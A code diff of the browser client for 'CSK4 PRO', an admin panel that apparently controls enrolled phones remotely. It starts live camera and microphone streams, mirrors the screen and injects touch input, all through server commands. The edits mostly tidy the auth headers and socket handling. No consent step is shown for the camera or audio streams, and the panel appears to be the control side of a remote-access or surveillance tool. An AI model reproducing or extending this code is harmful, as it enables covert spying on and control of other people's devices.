@@ -1,6 +1,5 @@
 // ============================================
-// CSK4 PRO - WebRTC Client
-// Camera Stream + Audio Stream + Screen Mirror
+// CSK4 PRO - WebRTC Client (FIXED)
 // ============================================
 
 let peerConnection = null;
@@ -9,13 +8,18 @@ let webrtcSocket = null;
 let pendingIceCandidates = [];
 let isScreenMirror = false;
 
+function authHeadersW() {
+  return {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token') || '')
+  };
+}
+
 // ============ SOCKET INIT ============
 function initWebRTCSocket() {
   if (webrtcSocket) return;
-  // Reuse admin panel socket if available (avoid double connection)
   webrtcSocket = (typeof window !== 'undefined' && window.socket) ? window.socket : io();
 
-  // Camera/audio stream answer
   webrtcSocket.on('webrtc-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -24,8 +28,6 @@ function initWebRTCSocket() {
         );
         const status = document.getElementById(isScreenMirror ? 'screenStatus' : 'liveStatus');
         if (status) status.textContent = '🔴 LIVE';
-        
-        // Process pending ICE candidates
         for (const c of pendingIceCandidates) {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
@@ -34,7 +36,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('Answer error:', e); }
   });
 
-  // Screen mirror answer
   webrtcSocket.on('screen-mirror-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -43,7 +44,6 @@ function initWebRTCSocket() {
         );
         const status = document.getElementById('screenStatus');
         if (status) status.textContent = '🔴 MIRRORING';
-        
         for (const c of pendingIceCandidates) {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
@@ -52,7 +52,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('Screen answer error:', e); }
   });
 
-  // ICE for camera
   webrtcSocket.on('webrtc-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -69,7 +68,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('ICE error:', e); }
   });
 
-  // ICE for screen
   webrtcSocket.on('screen-mirror-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -87,7 +85,7 @@ function initWebRTCSocket() {
   });
 }
 
-// ============ CAMERA / AUDIO LIVE STREAM ============
+// ============ CAMERA / AUDIO LIVE ============
 function startLiveStream(deviceId, type = 'camera') {
   if (!deviceId) { alert('Device select karein'); return; }
   stopLiveStream(true);
@@ -106,7 +104,6 @@ function startLiveStream(deviceId, type = 'camera') {
     ]
   });
 
-  // Receive tracks
   peerConnection.ontrack = (event) => {
     const video = document.getElementById('liveVideo');
     const audio = document.getElementById('liveAudio');
@@ -155,17 +152,14 @@ function startLiveStream(deviceId, type = 'camera') {
       target: deviceId,
       signal: peerConnection.localDescription
     });
-
-    // Trigger device to start stream
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({
         deviceId,
         command: type === 'audio' ? 'start_audio_stream' : 'start_webrtc'
       })
     });
-
     const status = document.getElementById('liveStatus');
     if (status) status.textContent = 'Connecting...';
   })
@@ -185,7 +179,7 @@ function stopLiveStream(silent = false) {
   if (currentStreamDevice && !silent && !isScreenMirror) {
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
     });
   }
@@ -200,12 +194,12 @@ function switchCamera() {
   if (!currentStreamDevice) { alert('Pehle stream start karein'); return; }
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+    headers: authHeadersW(),
     body: JSON.stringify({ deviceId: currentStreamDevice, command: 'switch_camera' })
   }).then(() => toast('🔄 Camera switched'));
 }
 
-// ============ SCREEN MIRROR (MediaProjection) ============
+// ============ SCREEN MIRROR ============
 function startScreenMirror(deviceId) {
   if (!deviceId) { alert('Device select karein'); return; }
   stopLiveStream(true);
@@ -258,14 +252,11 @@ function startScreenMirror(deviceId) {
       target: deviceId,
       signal: peerConnection.localDescription
     });
-
-    // Trigger device to start screen mirror
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({ deviceId, command: 'start_screen_mirror' })
     });
-
     const status = document.getElementById('screenStatus');
     if (status) status.textContent = 'Waiting for user permission...';
   })
@@ -283,7 +274,7 @@ function stopScreenMirror(silent = false) {
   if (currentStreamDevice && !silent && isScreenMirror) {
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
     });
   }
@@ -295,25 +286,22 @@ function stopScreenMirror(silent = false) {
   }
 }
 
-// ============ TOUCH CONTROL ============
+// ============ TOUCH ============
 function sendTouch(action, x = 0.5, y = 0.5) {
   const deviceId = document.getElementById('screenDevice')?.value || currentStreamDevice;
   if (!deviceId) { alert('Device select karein'); return; }
-  
   let command = 'touch_tap';
   if (action === 'swipe') command = 'touch_swipe';
   if (action === 'back') command = 'touch_back';
   if (action === 'home') command = 'touch_home';
   if (action === 'recent') command = 'touch_recent';
-  
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+    headers: authHeadersW(),
     body: JSON.stringify({ deviceId, command, params: { x, y } })
   }).then(() => toast('👆 Touch: ' + action));
 }
 
-// ============ VIDEO CLICK FOR TAP ============
 document.addEventListener('click', (e) => {
   const screenVideo = document.getElementById('screenVideo');
   if (screenVideo && e.target === screenVideo) {
@@ -329,7 +317,8 @@ window.addEventListener('beforeunload', () => {
   if (peerConnection) {
     try { peerConnection.close(); } catch (e) {}
   }
-  if (webrtcSocket) {
+  // ✅ Only disconnect if NOT the shared admin socket
+  if (webrtcSocket && webrtcSocket !== window.socket) {
     try { webrtcSocket.disconnect(); } catch (e) {}
   }
 });
